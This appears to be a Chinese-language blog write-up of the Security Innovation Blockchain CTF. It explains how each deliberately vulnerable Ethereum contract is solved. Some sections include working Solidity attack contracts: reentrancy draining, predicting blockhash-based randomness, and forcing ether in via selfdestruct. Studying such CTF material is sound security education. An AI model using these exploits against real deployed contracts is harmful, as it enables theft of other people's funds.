---
title: "【CTF Writeups】Security Innovation Blockchain CTF"
date: 2019-06-07
categories:
- [資安, writeups]
tags:
- ctf
- security
- writeups
- blockchain
---

這邊是紀錄我寫 [Security Innovation Blockchain CTF](https://blockchain-ctf.securityinnovation.com/#/) 的 Writeups

## Donation

這題是簽到題
就只是讓我們呼叫合約裡面的這個函式 `withdrawDonationsFromTheSuckersWhoFellForIt`

## Lock Box

這題有個 `private` 的 `pin` 變數，但是 `private` 只是代表那個變數沒有 `getter` 函式，把合約的狀態抓下來就看光光啦
使用 [`web3.eth.getStorageAt`](https://web3js.readthedocs.io/en/1.0/web3-eth.html#eth-getstorageat) 這個函式
父合約的變數會在子合約的變數的前面
所以 position 0 的位址是 `authorizedToPlay`，而 position 1 的位址就是 `pin`
變數在 storage 裡面怎麼擺的可以參考這篇 [Understanding Ethereum Smart Contract Storage](https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/)

## Piggy Bank

這題直接呼叫 `collectFunds` 就好了
只有 `PiggyBank` 的 `collectFunds` 有 `onlyOwner`，`CharliesPiggyBank` 的 `collectFunds` 沒有 `onlyOwner`

## SI Token Sale

這題的 `purchaseTokens` 沒有用 SafeMath，也沒有檢查 `_value` 要大於 `feeAmount`
先轉個 `0.000001` 給合約，這樣 `0.000001 - 0.00001` 就會 underflow 變成很大的數字，就得到了超多的 token
然後再用 `refundTokens` 就可以半價把 token 換成 ether 錢錢了

## Secure Bank

`SecureBank` 的 `withdraw` 和 `MembersBank` 的 `withdraw` 其中的 `_value` 參數形態不一樣
他們會被看成是不一樣的函式，所以會有兩個不一樣的型態 `withdraw` 可以呼叫
而 `MembersBank` 的 `withdraw` 沒有檢查是不是本人，所以就直接把 contract creator 的錢領走

## Lottery

這題要猜 `entropy^entropy2` 的值，猜到就可以拿走裡面的錢錢

`entropy = blockhash(block.number)`，但是我們沒辦法知道這個 block 的 blockhash，因為這個 block 還沒算完
但這樣寫不會有錯誤，只是出來的值會是 `0`
既然 `entropy = 0` 那就只剩 `entropy2`，而 `entropy2` 是根據 `msg.sender` 來的
所以我們可以直接算出 `_seed` 的值
可以直接用 [remix](https://remix.ethereum.org) 寫個簡單的 smart contract 幫我們算那個值，然後利用 `event` 來印出那個值 ( 當 print 用 )

```solidity
pragma solidity ^0.5.9;

contract test {
    event Log(bytes32 value);

    function go () public {
        emit Log(keccak256(abi.encodePacked(msg.sender)));
    }
}
```

或是直接寫一個攻擊合約，去呼叫 `play` 函式
記得要先把這個合約加到 `authorizedToPlay`，如果是 gas 不夠就調高 gas limit 吧

```solidity
pragma solidity ^0.5.9;

import "./challenge.sol";

contract hack {
    function exploit(address payable _target) public payable {
        Lottery target = Lottery(_target);

        bytes32 entropy2 = keccak256(abi.encodePacked(this));
        uint256 seeds = uint256(entropy2);

        target.play.value(msg.value)(seeds);

        msg.sender.transfer(address(this).balance);
    }
}
```

## Trust Fund

這題是經典的 reentrant attack

```solidity
pragma solidity ^0.5.9;

contract TrustFund {
    function withdraw() external {}
}

contract hack {
    address target = 0xd297ab1c9653295BdE4f6b2e32574Ac5DD994997;
    uint count = 10;

    function () external payable {
        if (count > 0) {
            count--;
            TrustFund trust = TrustFund(target);
            trust.withdraw();
        }
    }

    function exploit () public {
        TrustFund trust = TrustFund(target);
        trust.withdraw();
    }

    function withdraw () public {
        msg.sender.transfer(address(this).balance);
    }
}
```

## Heads or Tails

這題跟 Lottery 很像，不過用的是上一個 block 的 blockhash
那就寫個攻擊合約去呼叫 `play`，就可以算出一樣的 `entropy`
給 `0.1 ether` 能賺 `0.05 ether`，所以玩個 20 次就把錢全部撈出來啦
記得要寫 `fallback` 函式才能接錢進來呀 ( 我這裡卡超久der )

```solidity
pragma solidity ^0.5.9;

contract HeadsOrTails {
    function play(bool _heads) external payable {}
}

contract hack {
    address target = 0xf8583ccB9900615e0b8304A16539EBFD96c2B0af;

	function () external payable {}

    function exploit () public payable {
        bytes32 entropy = blockhash(block.number - 1);
        bool coinFlip = (entropy[0] & '\x01') == '\x01';

        HeadsOrTails heads = HeadsOrTails(target);

		for (uint i = 0; i < 20; i++) {
			heads.play.value(0.1 ether)(coinFlip);
		}

        msg.sender.transfer(address(this).balance);
    }
}
```

## Record Label

這題的題目很長，主要的邏輯就是你領錢的時候會被 `royalties` 抽成，`manager` 會抽成 80 趴的錢錢
所以如果直接呼叫 `withdrawFundsAndPayRoyalties` 就可以拿到 `0.2 ether`，`royalties` 抽走 `0.8 ether`，這題就解掉了 ( 題目合約 `balance = 0` )
不過正確的解法 ( 我全都要 ) 應該是找出 `_manager` 的地址，然後呼叫 `addRoyaltyReceiver` 把 `receiverToPercentOfProfit` 這個 mapping 中 `_manager` 的 percent 覆寫成 0
這樣去領錢就不會被抽成了

## Slot Machine

這題的題目很短，就一個 `fallback` 函式
但是第一行限制一次只能匯款 `1 szabo` ( `0.000001 ether` )
目標是要讓這個合約的 balance 大於等於 `5 ether`，他就會把所有錢錢都給你
其中一個不透過 `fallback` 給錢的方法就是用 `selfdestruct`
`selfdestruct` 就是把合約清除掉，在被清除掉之前，這個合約可以把他的錢錢匯款給一個帳戶，而這個匯款的動作不會經過 `fallback` 函式
寫一個攻擊合約，並給他 `5 ether`，讓他自我毀滅，並在毀滅之前把 `5 ether` 匯款給題目合約

```solidity
pragma solidity ^0.5.9;

contract hack {
    function exploit () public payable {
        selfdestruct(address(0x22f616f6b95e23efa8FBBAE44BeeC05890E12A4E));
    }
}
```

---

1. [https://f3real.github.io/tag/ethereum.html](https://f3real.github.io/tag/ethereum.html)
2. [https://xz.aliyun.com/t/2759](https://xz.aliyun.com/t/2759)
